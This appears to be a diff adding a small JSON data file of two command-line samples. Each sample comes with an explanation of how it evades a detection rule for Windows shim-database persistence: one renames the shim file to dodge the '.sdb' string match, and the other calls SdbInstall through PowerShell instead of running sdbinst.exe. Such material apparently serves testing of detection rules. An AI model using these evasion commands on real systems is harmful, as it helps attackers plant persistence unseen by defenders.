@@ -1,0 +1,10 @@
+[
+  {
+    "output": "sdbinst.exe -q C:\\Temp\\persistence_payload.txt",
+    "explanation": "Bypasses the 'selection_cli' condition by renaming the shim database file to have a non-.sdb extension. The sdbinst utility reads the file header to determine its format rather than relying strictly on the file extension, meaning it will still process the shim while the command line will not contain the explicitly monitored '.sdb' string."
+  },
+  {
+    "output": "powershell.exe -Command \"$code = '[DllImport(\\\"apphelp.dll\\\")] public static extern bool SdbInstall(string path);'; $type = Add-Type -MemberDefinition $code -Name 'Shim' -PassThru; $type::SdbInstall('C:\\Temp\\payload.sdb')\"",
+    "explanation": "Bypasses the 'selection_img' condition by avoiding the execution of sdbinst.exe entirely. Instead, it directly invokes the underlying API function (SdbInstall in apphelp.dll) used by sdbinst to register the shim. Since the executing image is powershell.exe and not sdbinst.exe, the rule fails to trigger."
+  }
+]
